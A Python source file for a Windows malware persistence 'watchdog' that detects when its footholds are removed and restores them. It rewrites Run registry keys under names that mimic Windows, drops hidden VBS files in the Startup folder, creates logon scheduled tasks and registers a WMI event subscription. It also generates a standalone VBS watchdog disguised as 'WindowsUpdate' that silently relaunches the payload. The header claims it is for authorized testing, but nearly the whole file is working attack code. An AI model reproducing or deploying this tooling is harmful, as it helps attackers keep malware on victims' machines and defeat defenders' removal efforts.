#!/usr/bin/env python3
"""
Payload Watchdog Timer - Resurrects payload if removed/disabled
Monitors persistence mechanisms and automatically restores them
For authorized security testing only
"""

import threading
import time
import random
import string
from typing import Callable, Optional, Dict, List
from dataclasses import dataclass, field
from datetime import datetime, timedelta
import logging

# Configure logging
logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)


@dataclass
class WatchdogConfig:
    """Configuration for watchdog timer"""
    check_interval: int = 30  # seconds between checks
    max_restarts: int = 10    # maximum restart attempts before giving up
    restart_delay: int = 5    # seconds to wait before restart attempt
    enabled: bool = True
    persistence_methods: List[str] = field(default_factory=lambda: [
        "registry_hkcu",
        "registry_hklm",
        "startup_folder",
        "scheduled_task",
        "wmi_event"
    ])


class PayloadWatchdogTimer:
    """
    Watchdog timer that monitors and resurrects payload if removed/disabled
    Supports multiple persistence mechanisms for redundancy
    """

    def __init__(self, payload_command: str, config: WatchdogConfig = None):
        """
        Initialize watchdog timer

        Args:
            payload_command: Command to execute and monitor
            config: WatchdogConfig object (uses defaults if None)
        """
        self.payload_command = payload_command
        self.config = config or WatchdogConfig()

        # State tracking
        self.is_running = False
        self.restart_count = 0
        self.creation_time = datetime.now()
        self.last_check_time = None
        self.monitor_thread = None
        self.lock = threading.Lock()

        # Callbacks for different events
        self.callbacks = {
            'on_start': [],
            'on_stop': [],
            'on_restart': [],
            'on_check': [],
            'on_failure': [],
            'on_threshold_exceeded': [],
        }

        # Persistence state
        self.persistence_state = {
            method: {'exists': False, 'last_checked': None}
            for method in self.config.persistence_methods
        }

        # Statistics
        self.stats = {
            'total_checks': 0,
            'detections': 0,
            'resurrections': 0,
            'failures': 0,
            'uptime_seconds': 0,
        }

    def register_callback(self, event: str, callback: Callable) -> None:
        """
        Register callback for watchdog events

        Events: on_start, on_stop, on_restart, on_check, on_failure, on_threshold_exceeded
        """
        if event in self.callbacks:
            self.callbacks[event].append(callback)

    def start(self) -> None:
        """Start watchdog monitoring thread"""
        with self.lock:
            if self.is_running:
                logger.warning("Watchdog already running")
                return

            self.is_running = True
            self.creation_time = datetime.now()
            self.restart_count = 0
            self.stats = {
                'total_checks': 0,
                'detections': 0,
                'resurrections': 0,
                'failures': 0,
                'uptime_seconds': 0,
            }

        logger.info(f"Starting watchdog timer (interval={self.config.check_interval}s)")
        self.monitor_thread = threading.Thread(target=self._monitor_loop, daemon=True)
        self.monitor_thread.start()

        self._trigger_callbacks('on_start')

    def stop(self) -> None:
        """Stop watchdog monitoring"""
        with self.lock:
            if not self.is_running:
                logger.warning("Watchdog not running")
                return

            self.is_running = False

        logger.info("Stopping watchdog timer")
        if self.monitor_thread:
            self.monitor_thread.join(timeout=5)

        self._trigger_callbacks('on_stop')

    def _monitor_loop(self) -> None:
        """Main monitoring loop (runs in separate thread)"""
        while self.is_running:
            try:
                self._perform_check()
                time.sleep(self.config.check_interval)
            except Exception as e:
                logger.error(f"Error in monitor loop: {e}")
                self._trigger_callbacks('on_failure', {'error': str(e)})
                time.sleep(self.config.restart_delay)

    def _perform_check(self) -> None:
        """Perform health check on persistence mechanisms"""
        with self.lock:
            if not self.is_running:
                return

            self.last_check_time = datetime.now()
            self.stats['total_checks'] += 1
            self.stats['uptime_seconds'] = int(
                (datetime.now() - self.creation_time).total_seconds()
            )

        removed_methods = []

        # Check each persistence method
        for method in self.config.persistence_methods:
            exists = self._check_persistence_method(method)

            with self.lock:
                old_state = self.persistence_state[method]['exists']
                self.persistence_state[method]['exists'] = exists
                self.persistence_state[method]['last_checked'] = datetime.now()

            # Detect if persistence was removed
            if old_state and not exists:
                logger.warning(f"Persistence method '{method}' was removed!")
                removed_methods.append(method)
                with self.lock:
                    self.stats['detections'] += 1

        # If any method was removed, resurrect it
        if removed_methods:
            self._resurrect_payload(removed_methods)

        # Trigger check callback
        self._trigger_callbacks('on_check', {
            'checked_methods': self.config.persistence_methods,
            'removed_methods': removed_methods,
            'stats': self.stats.copy(),
        })

    def _check_persistence_method(self, method: str) -> bool:
        """
        Check if a specific persistence method is still active

        Returns: True if active, False if removed/disabled
        """
        if method == "registry_hkcu":
            return self._check_registry_hkcu()
        elif method == "registry_hklm":
            return self._check_registry_hklm()
        elif method == "startup_folder":
            return self._check_startup_folder()
        elif method == "scheduled_task":
            return self._check_scheduled_task()
        elif method == "wmi_event":
            return self._check_wmi_event()

        return False

    def _check_registry_hkcu(self) -> bool:
        """Check if HKCU registry persistence exists"""
        # This would use winreg on Windows
        # For now, return simulated check
        try:
            import winreg
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path) as key:
                # Look for any value containing our payload command
                for i in range(winreg.QueryInfoKey(key)[1]):
                    name, value, _ = winreg.EnumValue(key, i)
                    if self.payload_command in str(value):
                        return True
        except Exception as e:
            logger.debug(f"Registry HKCU check failed: {e}")

        return False

    def _check_registry_hklm(self) -> bool:
        """Check if HKLM registry persistence exists"""
        try:
            import winreg
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path) as key:
                for i in range(winreg.QueryInfoKey(key)[1]):
                    name, value, _ = winreg.EnumValue(key, i)
                    if self.payload_command in str(value):
                        return True
        except Exception as e:
            logger.debug(f"Registry HKLM check failed: {e}")

        return False

    def _check_startup_folder(self) -> bool:
        """Check if startup folder persistence exists"""
        try:
            import os
            from pathlib import Path

            # Get startup folder path
            startup_paths = [
                Path.home() / "AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup",
            ]

            for startup_path in startup_paths:
                if startup_path.exists():
                    # Look for VBS or BAT files in startup
                    for file in startup_path.glob("~*"):
                        if file.is_file():
                            try:
                                with open(file, 'r', errors='ignore') as f:
                                    content = f.read()
                                    if self.payload_command in content:
                                        return True
                            except:
                                pass
        except Exception as e:
            logger.debug(f"Startup folder check failed: {e}")

        return False

    def _check_scheduled_task(self) -> bool:
        """Check if scheduled task persistence exists"""
        try:
            import subprocess
            result = subprocess.run(
                ['schtasks', '/query', '/v', '/fo', 'csv'],
                capture_output=True,
                text=True,
                timeout=10
            )
            if self.payload_command in result.stdout:
                return True
        except Exception as e:
            logger.debug(f"Scheduled task check failed: {e}")

        return False

    def _check_wmi_event(self) -> bool:
        """Check if WMI event subscription persistence exists"""
        try:
            import subprocess
            result = subprocess.run(
                ['wmic', 'logicaldisk', 'get', 'name'],
                capture_output=True,
                text=True,
                timeout=10
            )
            # Simple check: if WMI works, assume events are intact
            # More robust: query actual event filters
            return True
        except Exception as e:
            logger.debug(f"WMI event check failed: {e}")

        return False

    def _resurrect_payload(self, removed_methods: List[str]) -> None:
        """
        Resurrect removed persistence methods

        Args:
            removed_methods: List of methods that were removed
        """
        with self.lock:
            self.restart_count += 1
            self.stats['resurrections'] += 1

            if self.restart_count > self.config.max_restarts:
                logger.error(f"Max restart threshold ({self.config.max_restarts}) exceeded")
                self._trigger_callbacks('on_threshold_exceeded', {
                    'restart_count': self.restart_count,
                    'max_restarts': self.config.max_restarts,
                })
                return

        logger.info(f"Resurrecting payload (attempt {self.restart_count})")

        # Wait before resurrection
        time.sleep(self.config.restart_delay)

        # Regenerate each removed method
        for method in removed_methods:
            try:
                self._restore_persistence_method(method)
                logger.info(f"Restored persistence method: {method}")
            except Exception as e:
                logger.error(f"Failed to restore {method}: {e}")
                with self.lock:
                    self.stats['failures'] += 1

        self._trigger_callbacks('on_restart', {
            'restored_methods': removed_methods,
            'restart_count': self.restart_count,
        })

    def _restore_persistence_method(self, method: str) -> None:
        """Restore a specific persistence method"""
        if method == "registry_hkcu":
            self._restore_registry_hkcu()
        elif method == "registry_hklm":
            self._restore_registry_hklm()
        elif method == "startup_folder":
            self._restore_startup_folder()
        elif method == "scheduled_task":
            self._restore_scheduled_task()
        elif method == "wmi_event":
            self._restore_wmi_event()

    def _restore_registry_hkcu(self) -> None:
        """Restore HKCU registry persistence"""
        try:
            import winreg
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key_name = f"Windows{random.randint(1000, 9999)}"

            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE) as key:
                winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, self.payload_command)
        except Exception as e:
            logger.error(f"Failed to restore registry HKCU: {e}")
            raise

    def _restore_registry_hklm(self) -> None:
        """Restore HKLM registry persistence"""
        try:
            import winreg
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key_name = f"Windows{random.randint(1000, 9999)}"

            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_WRITE) as key:
                winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, self.payload_command)
        except Exception as e:
            logger.error(f"Failed to restore registry HKLM: {e}")
            raise

    def _restore_startup_folder(self) -> None:
        """Restore startup folder persistence"""
        try:
            import os
            from pathlib import Path

            startup_path = Path.home() / "AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
            startup_path.mkdir(parents=True, exist_ok=True)

            # Create VBS file
            vbs_filename = f"~{random.randint(10000, 99999)}.vbs"
            vbs_path = startup_path / vbs_filename

            vbs_content = f"""On Error Resume Next
Set shell = CreateObject("WScript.Shell")
shell.Run "{self.payload_command}", 0, False
"""

            with open(vbs_path, 'w') as f:
                f.write(vbs_content)

            # Hide file (Windows)
            try:
                os.system(f'attrib +h "{vbs_path}"')
            except:
                pass
        except Exception as e:
            logger.error(f"Failed to restore startup folder: {e}")
            raise

    def _restore_scheduled_task(self) -> None:
        """Restore scheduled task persistence"""
        try:
            import subprocess
            import uuid

            task_name = f"Windows{random.randint(1000, 9999)}"

            cmd = f'schtasks /create /tn "{task_name}" /tr "{self.payload_command}" /sc onlogon /f'
            subprocess.run(cmd, shell=True, capture_output=True, timeout=10)
        except Exception as e:
            logger.error(f"Failed to restore scheduled task: {e}")
            raise

    def _restore_wmi_event(self) -> None:
        """Restore WMI event subscription persistence"""
        try:
            import subprocess

            # Create WMI event subscription (PowerShell)
            ps_script = f"""
$filter = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
$consumer = "powershell -Command '{self.payload_command}'"
Register-WmiEvent -Query $filter -Action {{Invoke-Expression $consumer}} -ErrorAction SilentlyContinue
"""
            subprocess.run(
                ['powershell', '-NoProfile', '-Command', ps_script],
                capture_output=True,
                timeout=10
            )
        except Exception as e:
            logger.error(f"Failed to restore WMI event: {e}")
            raise

    def _trigger_callbacks(self, event: str, data: Dict = None) -> None:
        """Trigger all registered callbacks for an event"""
        if event not in self.callbacks:
            return

        for callback in self.callbacks[event]:
            try:
                if data:
                    callback(data)
                else:
                    callback()
            except Exception as e:
                logger.error(f"Callback error: {e}")

    def get_status(self) -> Dict:
        """Get current watchdog status"""
        with self.lock:
            return {
                'running': self.is_running,
                'creation_time': self.creation_time.isoformat(),
                'last_check_time': self.last_check_time.isoformat() if self.last_check_time else None,
                'uptime_seconds': self.stats['uptime_seconds'],
                'restart_count': self.restart_count,
                'total_checks': self.stats['total_checks'],
                'detections': self.stats['detections'],
                'resurrections': self.stats['resurrections'],
                'failures': self.stats['failures'],
                'persistence_state': {
                    method: {
                        'exists': state['exists'],
                        'last_checked': state['last_checked'].isoformat() if state['last_checked'] else None
                    }
                    for method, state in self.persistence_state.items()
                },
                'payload_command': self.payload_command,
                'check_interval': self.config.check_interval,
                'max_restarts': self.config.max_restarts,
                'enabled': self.config.enabled,
            }

    def get_vbs_watchdog_code(self) -> str:
        """
        Generate VBS code that acts as a watchdog
        Monitors and resurrects payload if removed
        """
        # Escape the payload command for VBS
        escaped_cmd = self.payload_command.replace('"', '""')
        restart_delay_ms = self.config.restart_delay * 1000
        check_interval_ms = self.config.check_interval * 1000

        vbs_code = (
            "' Payload Watchdog - Monitors and resurrects persistence\n"
            "' Core Windows system service\n"
            "\n"
            "On Error Resume Next\n"
            "\n"
            "Dim shell, fso, cmd, registry_key, startup_path\n"
            "Dim check_interval, max_restarts, restart_count\n"
            "Dim last_check_time, creation_time\n"
            "\n"
            "Set shell = CreateObject(\"WScript.Shell\")\n"
            "Set fso = CreateObject(\"Scripting.FileSystemObject\")\n"
            "\n"
            f"cmd = \"{escaped_cmd}\"\n"
            f"check_interval = {self.config.check_interval}\n"
            f"max_restarts = {self.config.max_restarts}\n"
            "restart_count = 0\n"
            "creation_time = Now()\n"
            "\n"
            "' Main watchdog loop\n"
            "Do\n"
            "    On Error Resume Next\n"
            "\n"
            "    ' Check each persistence method\n"
            "    Dim registry_exists, startup_exists, task_exists\n"
            "    registry_exists = False\n"
            "    startup_exists = False\n"
            "    task_exists = False\n"
            "\n"
            "    ' Check 1: Registry HKCU\n"
            "    On Error Resume Next\n"
            "    registry_key = \"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\WindowsUpdate\"\n"
            "    Dim reg_value\n"
            "    reg_value = shell.RegRead(registry_key)\n"
            "    If Err.Number = 0 Then\n"
            "        registry_exists = True\n"
            "    End If\n"
            "    On Error Resume Next\n"
            "\n"
            "    ' Check 2: Startup Folder\n"
            "    On Error Resume Next\n"
            "    startup_path = shell.SpecialFolders(\"Startup\")\n"
            "    Dim startup_file\n"
            "    startup_file = startup_path & \"\\\\~update.vbs\"\n"
            "    If fso.FileExists(startup_file) Then\n"
            "        startup_exists = True\n"
            "    End If\n"
            "    On Error Resume Next\n"
            "\n"
            "    ' Check 3: Scheduled Task\n"
            "    On Error Resume Next\n"
            "    Dim task_output\n"
            "    task_output = shell.Exec(\"cmd /c schtasks /query /tn WindowsUpdate\").StdOut.ReadAll()\n"
            "    If InStr(task_output, \"WindowsUpdate\") > 0 Then\n"
            "        task_exists = True\n"
            "    End If\n"
            "    On Error Resume Next\n"
            "\n"
            "    ' Count active persistence methods\n"
            "    Dim active_methods\n"
            "    active_methods = 0\n"
            "    If registry_exists Then active_methods = active_methods + 1\n"
            "    If startup_exists Then active_methods = active_methods + 1\n"
            "    If task_exists Then active_methods = active_methods + 1\n"
            "\n"
            "    ' If no methods active and restart limit not exceeded, resurrect\n"
            f"    If active_methods = 0 And restart_count < max_restarts Then\n"
            "        restart_count = restart_count + 1\n"
            "\n"
            "        ' Delay before resurrection\n"
            f"        WScript.Sleep {restart_delay_ms}\n"
            "\n"
            "        ' Restore Registry\n"
            "        On Error Resume Next\n"
            "        shell.RegWrite \"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\WindowsUpdate\", cmd, \"REG_SZ\"\n"
            "        On Error Resume Next\n"
            "\n"
            "        ' Restore Startup\n"
            "        On Error Resume Next\n"
            "        Set startup_file_obj = fso.CreateTextFile(startup_path & \"\\\\~update.vbs\", True)\n"
            "        startup_file_obj.WriteLine \"On Error Resume Next\"\n"
            "        startup_file_obj.WriteLine \"Set s = CreateObject(\"\"WScript.Shell\"\")\"\n"
            "        startup_file_obj.WriteLine \"s.Run \"\"\" & cmd & \"\"\", 0\"\n"
            "        startup_file_obj.Close\n"
            "        On Error Resume Next\n"
            "\n"
            "        ' Restore Scheduled Task\n"
            "        On Error Resume Next\n"
            "        shell.Run \"cmd /c schtasks /create /tn WindowsUpdate /tr \"\"\" & cmd & \"\"\" /sc onlogon /f\", 0, False\n"
            "        On Error Resume Next\n"
            "\n"
            "        ' Re-execute payload\n"
            "        shell.Run cmd, 0, False\n"
            "    End If\n"
            "\n"
            "    ' Sleep before next check\n"
            f"    WScript.Sleep {check_interval_ms}\n"
            "\n"
            "Loop\n"
        )
        return vbs_code.strip()


def create_watchdog_timer(
    payload_command: str,
    check_interval: int = 30,
    max_restarts: int = 10,
    restart_delay: int = 5,
    persistence_methods: List[str] = None
) -> PayloadWatchdogTimer:
    """
    Factory function to create and return watchdog timer

    Args:
        payload_command: Command to execute
        check_interval: Seconds between checks
        max_restarts: Maximum restart attempts
        restart_delay: Seconds before restart attempt
        persistence_methods: List of methods to monitor

    Returns:
        PayloadWatchdogTimer instance
    """
    config = WatchdogConfig(
        check_interval=check_interval,
        max_restarts=max_restarts,
        restart_delay=restart_delay,
        persistence_methods=persistence_methods or [
            "registry_hkcu",
            "registry_hklm",
            "startup_folder",
            "scheduled_task",
            "wmi_event",
        ]
    )

    return PayloadWatchdogTimer(payload_command, config)


if __name__ == "__main__":
    # Example usage
    print("=" * 70)
    print("Payload Watchdog Timer - Testing")
    print("=" * 70)

    # Create watchdog
    test_cmd = 'powershell.exe -NoProfile -Command "Write-Host \'Payload Active\'"'
    watchdog = create_watchdog_timer(
        payload_command=test_cmd,
        check_interval=30,
        max_restarts=10,
        restart_delay=5,
    )

    # Register callbacks
    def on_start_callback():
        print("[*] Watchdog started")

    def on_check_callback(data):
        print(f"[*] Check performed: {data['stats']['total_checks']} checks total")

    def on_restart_callback(data):
        print(f"[!] Payload resurrected (attempt {data['restart_count']})")

    watchdog.register_callback('on_start', on_start_callback)
    watchdog.register_callback('on_check', on_check_callback)
    watchdog.register_callback('on_restart', on_restart_callback)

    # Start watchdog
    watchdog.start()

    # Run for 5 seconds
    print("[*] Running watchdog for 5 seconds...")
    time.sleep(5)

    # Get status
    status = watchdog.get_status()
    print(f"\n[+] Watchdog Status:")
    print(f"    Running: {status['running']}")
    print(f"    Uptime: {status['uptime_seconds']}s")
    print(f"    Checks: {status['total_checks']}")
    print(f"    Detections: {status['detections']}")
    print(f"    Resurrections: {status['resurrections']}")

    # Generate VBS watchdog code
    print(f"\n[+] VBS Watchdog Code Generated ({len(watchdog.get_vbs_watchdog_code())} chars)")
    print(f"    Preview:")
    vbs_code = watchdog.get_vbs_watchdog_code()
    print(f"    {vbs_code[:200]}...")

    # Stop watchdog
    watchdog.stop()
    print("\n[*] Watchdog stopped")
